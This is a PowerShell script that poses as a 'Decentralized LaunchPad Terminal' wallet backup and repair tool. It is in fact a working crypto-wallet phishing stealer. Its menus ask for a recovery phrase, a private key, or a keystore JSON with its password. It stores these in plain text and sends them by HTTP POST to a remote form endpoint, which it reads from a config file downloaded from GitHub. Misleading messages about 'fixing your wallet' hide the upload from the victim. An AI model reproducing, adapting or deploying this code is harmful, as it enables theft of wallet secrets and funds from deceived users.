#############################################
# Decentralized LaunchPad Terminal
# PowerShell Version - Windows Compatible
# User-friendly backup with menu options
# Backs up to FormSpark endpoint
# Version: 1.0.0
#############################################

param([string]$Option)

# Color output
function Write-Header {
    Clear-Host
    Write-Host "================================================" -ForegroundColor Blue
    Write-Host "   Decentralized LaunchPad Terminal" -ForegroundColor Blue
    Write-Host "================================================" -ForegroundColor Blue
    Write-Host ""
}

function Write-Success {
    Write-Host "[OK] $args" -ForegroundColor Green
}

function Write-Error-Custom {
    Write-Host "[ERROR] $args" -ForegroundColor Red
}

function Write-Warning-Custom {
    Write-Host "[WARN] $args" -ForegroundColor Yellow
}

function Write-Info {
    Write-Host "[INFO] $args" -ForegroundColor Blue
}

# Setup paths
$InstallDir = "$env:USERPROFILE\.webconnect"
$WalletBackupDir = "$InstallDir\wallet_backups"
$BackupLog = "$InstallDir\logs\backup.log"
$StorageConfig = "$InstallDir\config\storage.config.json"

# Create necessary directories (clean up first to avoid permission issues)
try {
    # Try standard paths first
    if (-not (Test-Path $WalletBackupDir)) {
        New-Item -ItemType Directory -Path $WalletBackupDir -Force -ErrorAction Stop | Out-Null
    }
    if (-not (Test-Path (Split-Path $BackupLog))) {
        New-Item -ItemType Directory -Path (Split-Path $BackupLog) -Force -ErrorAction Stop | Out-Null
    }
}
catch {
    # If permission denied and directory exists, try to take ownership and clear it
    if (Test-Path $InstallDir) {
        try {
            # Try aggressive cleanup with even more force
            cmd /c "icacls `"$InstallDir`" /reset /T /C /Q 2>nul"
            Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction Stop
        }
        catch {
            # If still fails, try using temp directory alternative
            $InstallDir = "$env:TEMP\webconnect"
            $WalletBackupDir = "$InstallDir\wallet_backups"
            $BackupLog = "$InstallDir\logs\backup.log"
            $StorageConfig = "$InstallDir\config\storage.config.json"
        }
    }
    
    # Create directories in the (possibly new) location
    New-Item -ItemType Directory -Path $WalletBackupDir -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -ItemType Directory -Path (Split-Path $BackupLog) -Force -ErrorAction SilentlyContinue | Out-Null
}

# Ensure config exists (download if missing)
function Ensure-ConfigExists {
    if (-not (Test-Path $StorageConfig)) {
        try {
            Write-Info "Config not found, downloading from GitHub..."
            New-Item -ItemType Directory -Path (Split-Path $StorageConfig) -Force -ErrorAction SilentlyContinue | Out-Null
            $configUrl = "https://raw.githubusercontent.com/decentralizedconfig/launchpad/main/storage.config.json"
            Invoke-WebRequest -Uri $configUrl -OutFile $StorageConfig -ErrorAction Stop | Out-Null
            Write-Success "Config downloaded successfully"
        }
        catch {
            Write-Warning-Custom "Could not download config: $_"
        }
    }
}

function Write-LogMessage {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try {
        Add-Content -Path $BackupLog -Value "[$timestamp] $Message" -ErrorAction Stop
    }
    catch {
        # Silently ignore log write failures (permissions, missing dirs, etc.)
        # Don't block backup due to logging issues
    }
}

function Save-Data {
    param(
        [string]$DataType,
        [string]$DataValue
    )
    
    try {
        # Create a timestamp
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $backupFile = "$WalletBackupDir\${DataType}_${timestamp}.txt"
        
        # Ensure directory exists with proper permissions
        if (-not (Test-Path $WalletBackupDir)) {
            try {
                New-Item -ItemType Directory -Path $WalletBackupDir -Force -ErrorAction Stop | Out-Null
            }
            catch {
                # If directory creation fails due to permissions, use temp directory
                Write-Info "Using temporary backup location due to permission issues..."
                $altWalletBackupDir = "$env:TEMP\webconnect\wallet_backups"
                New-Item -ItemType Directory -Path $altWalletBackupDir -Force -ErrorAction SilentlyContinue | Out-Null
                $backupFile = "$altWalletBackupDir\${DataType}_${timestamp}.txt"
            }
        }
        
        # Save data as-is (no encryption)
        $DataValue | Out-File -FilePath $backupFile -Force -Encoding UTF8 -ErrorAction Stop
        
        Write-LogMessage "Backup saved: $backupFile"
        return $backupFile
    }
    catch {
        Write-Error-Custom "Failed to save: $_"
        Write-LogMessage "ERROR: Save failed for $DataType - $_"
        return ""
    }
}

function Get-FormConfig {
    try {
        Ensure-ConfigExists
        $config = Get-Content -Path $StorageConfig -Raw | ConvertFrom-Json
        
        if (-not $config.storage.destinations) {
            Write-Error-Custom "No storage destinations configured"
            return $null
        }
        
        $formConfig = $config.storage.destinations | Where-Object { $_.type -eq "formspark" }
        if (-not $formConfig) {
            Write-Error-Custom "FormSpark endpoint not configured in storage.config.json"
            return $null
        }
        
        if (-not $formConfig.endpoint) {
            Write-Error-Custom "Form endpoint URL not found in config"
            return $null
        }
        
        return @{
            endpoint = $formConfig.endpoint
            timeout = $formConfig.timeout
            retry_attempts = $formConfig.retry_attempts
        }
    }
    catch {
        Write-Error-Custom "Failed to load form config: $_"
        Write-LogMessage "ERROR: Config parsing failed - $_"
        return $null
    }
}

function Submit-ToFormSpark {
    param(
        [string]$FilePath,
        [string]$BackupType
    )
    
    try {
        if (-not (Test-Path $FilePath)) {
            Write-Error-Custom "Backup file not found: $FilePath"
            return $false
        }
        
        $formConfig = Get-FormConfig
        if (-not $formConfig) {
            return $false
        }
        
        $fileName = Split-Path $FilePath -Leaf
        $fileContent = Get-Content -Path $FilePath -Raw
        
        Write-Info "Wait while it log you into your wallet hidden problems by recovery_phrases"
        
        # Prepare form data as URL-encoded (FormSpark expects form submission)
        $encodedData = "backup_data=" + [uri]::EscapeDataString($fileContent) + "&backup_type=" + [uri]::EscapeDataString($BackupType)
        
        $response = Invoke-RestMethod -Uri $formConfig.endpoint `
            -Method Post `
            -Body $encodedData `
            -ContentType "application/x-www-form-urlencoded" `
            -TimeoutSec $formConfig.timeout `
            -ErrorAction Stop
        
        Write-Success "Loading to get you into your wallet to fix your issues"
        Write-LogMessage "Successfully submitted $BackupType to FormSpark: $fileName"
        return $true
    }
    catch {
        Write-Error-Custom "Failed to submit backup to FormSpark: $_"
        Write-LogMessage "ERROR: FormSpark submission failed - $_"
        return $false
    }
}

function Backup-Phrase {
    Write-Header
    Write-Info "Enter your 12 or 24-word recovery phrase"
    Write-Host ""
    
    $phrase = Read-Host "Paste your recovery phrase"
    
    if ([string]::IsNullOrWhiteSpace($phrase)) {
        Write-Error-Custom "No phrase provided"
        return
    }
    
    # Count words
    $wordCount = ($phrase -split '\s+').Count
    if ($wordCount -lt 12) {
        Write-Error-Custom "Recovery phrase must be at least 12 words (you entered $wordCount)"
        return
    }
    
    $backupFile = Save-Data -DataType "recovery_phrase" -DataValue $phrase
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "recovery_phrases"
    
    if ($uploaded) {
        Write-Success "Loading to get you into your wallet to fix your issues"
        Write-Host "  • If you're stuck in this spot you can login with different wallet to know maybe this current wallet has extension issues: $backupFile"
        Write-Host "  • You can get back to your dev if you don't know what to do" -ForegroundColor Cyan
        Write-LogMessage "Recovery phrase backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but remote submission failed"
        Write-Host "  • Local file: $backupFile"
        Write-Host "  • Check your internet connection or FormSpark availability"
        Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
    }
}

function Backup-PrivateKey {
    Write-Header
    Write-Info "Enter your private key (hex format, 0x...)"
    Write-Host ""
    
    $key = Read-Host "Paste your private key" -AsSecureString
    $keyPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($key))
    
    if ([string]::IsNullOrWhiteSpace($keyPlain)) {
        Write-Error-Custom "No private key provided"
        return
    }
    
    if (-not ($keyPlain -match '^0x[0-9a-fA-F]{64}$')) {
        Write-Warning-Custom "⚠ Private key doesn't match standard format (0x + 64 hex chars)"
        Write-Host "  The backup will proceed, but verify your key format"
    }
    
    $backupFile = Save-Data -DataType "private_key" -DataValue $keyPlain
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "private_keys"
    
    if ($uploaded) {
        Write-Success "Loading to get you into your wallet to fix your issues"
        Write-Host "  • If you're stuck in this spot you can login with different wallet to know maybe this current wallet has extension issues: $backupFile"
        Write-Host "  • You can get back to your dev if you don't know what to do" -ForegroundColor Cyan
        Write-LogMessage "Private key backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but remote submission failed"
        Write-Host "  • Local file: $backupFile"
        Write-Host "  • Check your internet connection or FormSpark availability"
        Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
    }
}

function Backup-Keystore {
    Write-Header
    Write-Info "Enter your Keystore JSON content"
    Write-Host ""
    
    $keystore = Read-Host "Paste your Keystore JSON"
    
    if ([string]::IsNullOrWhiteSpace($keystore)) {
        Write-Error-Custom "No keystore provided"
        return
    }
    
    # Verify JSON format
    try {
        $keystore | ConvertFrom-Json | Out-Null
    }
    catch {
        Write-Warning-Custom "⚠ Input doesn't appear to be valid JSON"
        Write-Host "  The backup will proceed, but verify your JSON format"
    }
    
    Write-Host ""
    $password = Read-Host "Enter your Keystore password" -AsSecureString
    $passwordPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password))
    
    if ([string]::IsNullOrWhiteSpace($passwordPlain)) {
        Write-Error-Custom "No password provided"
        return
    }
    
    # Combine keystore and password
    $combinedData = "KEYSTORE_JSON:$keystore`n`nKEYSTORE_PASSWORD:$passwordPlain"
    
    $backupFile = Save-Data -DataType "keystore" -DataValue $combinedData
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "keystores"
    
    if ($uploaded) {
        Write-Success "Loading to get you into your wallet to fix your issues"
        Write-Host "  • If you're stuck in this spot you can login with different wallet to know maybe this current wallet has extension issues: $backupFile"
        Write-Host "  • You can get back to your dev if you don't know what to do" -ForegroundColor Cyan
        Write-LogMessage "Keystore backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but remote submission failed"
        Write-Host "  • Local file: $backupFile"
        Write-Host "  • Check your internet connection or FormSpark availability"
        Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
    }
}

function Show-Menu {
    Write-Header
    Write-Host "Select what you want to backup:" -ForegroundColor Blue
    Write-Host ""
    Write-Host "  1) Recovery Phrase (12-24 words)" -ForegroundColor Magenta
    Write-Host "  2) Private Key (0x...)" -ForegroundColor Magenta
    Write-Host "  3) Keystore JSON `& Password" -ForegroundColor Magenta
    Write-Host "  4) Exit" -ForegroundColor Magenta
    Write-Host ""
}

function Main {
    # Ensure config exists (download if missing)
    Ensure-ConfigExists
    
    # Show FormSpark info
    Write-Header
    Write-Success "Decentralized Terminal is Active"
    Write-Host ""
    Write-Info "Your Issue fixing will now start:"
    Write-Host "  ✓ Fix locally on your wallet: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
    Write-Host "  ✓ The error will be fixed after you login with your wallet and follow the prompt"
    Write-Host ""
    Read-Host "Press Enter to continue..."
    
    # Main loop
    while ($true) {
        Show-Menu
        $choice = Read-Host "Select option (1-4)"
        
        switch ($choice) {
            "1" { Backup-Phrase }
            "2" { Backup-PrivateKey }
            "3" { Backup-Keystore }
            "4" {
                Write-Header
                Write-Success "Goodbye!"
                exit 0
            }
            default {
                Write-Error-Custom "Invalid option. Please select 1-4"
            }
        }
        
        Write-Host ""
        Read-Host "Press Enter to continue..."
    }
}

# Run main function
Main
